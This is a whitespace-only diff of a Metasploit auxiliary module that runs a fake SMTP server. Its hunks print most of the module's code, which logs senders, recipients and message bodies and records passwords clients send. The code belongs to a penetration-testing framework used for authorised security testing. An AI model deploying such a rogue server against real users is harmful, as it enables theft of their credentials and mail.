@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::TcpServer
 	include Msf::Auxiliary::Report
 
-	
+
 	def initialize
 		super(
 			'Name'        => 'Authentication Capture: SMTP',
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 				 	[ 'Capture' ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[
 					'Capture'
 				],
@@ -54,23 +54,23 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		exploit()
 	end
-	
+
 	def on_client_connect(c)
 		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
 		c.put "220 SMTP Server Ready\r\n"
 	end
-	
+
 	def on_client_data(c)
 		data = c.get_once
 		return if not data
-		
+
 		print_status("SMTP: #{data.strip}")
-		
+
 		if(@state[c][:data_mode])
-		
+
 			@state[c][:data_buff] ||= ''
 			@state[c][:data_buff] += data
-			
+
 			idx = @state[c][:data_buff].index("\r\n.\r\n")
 			if(idx)
 				report_note(
@@ -82,44 +82,44 @@ class Metasploit3 < Msf::Auxiliary
 				@state[c][:data_mode] = nil
 				c.put "250 OK\r\n"
 			end
-		
+
 			return
 		end
-		
-		
+
+
 		cmd,arg = data.strip.split(/\s+/, 2)
 		arg ||= ""
-		
+
 		case cmd.upcase
 		when 'HELO', 'EHLO'
 			c.put "250 OK\r\n"
 			return
-			
+
 		when 'MAIL'
 			x,from = data.strip.split(":", 2)
 			@state[c][:from] = from.strip
 			c.put "250 OK\r\n"
 			return
-					
+
 		when 'RCPT'
 			x,targ = data.strip.split(":", 2)
 			@state[c][:rcpt] = targ.strip
 			c.put "250 OK\r\n"
 			return
-			
+
 		when 'DATA'
 			@state[c][:data_mode] = true
 			c.put "500 Error\r\n"
 			return
-			
+
 		when 'QUIT'
 			c.put "221 OK\r\n"
 			return
-						
+
 		when 'PASS'
-		
+
 			@state[c][:pass] = arg
-			
+
 			report_auth_info(
 				:host      => @state[c][:ip],
 				:proto     => 'pop3',
@@ -133,9 +133,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		c.put "503 Server Error\r\n"
 		return
-							
+
 	end
-	
+
 	def on_client_close(c)
 		@state.delete(c)
 	end
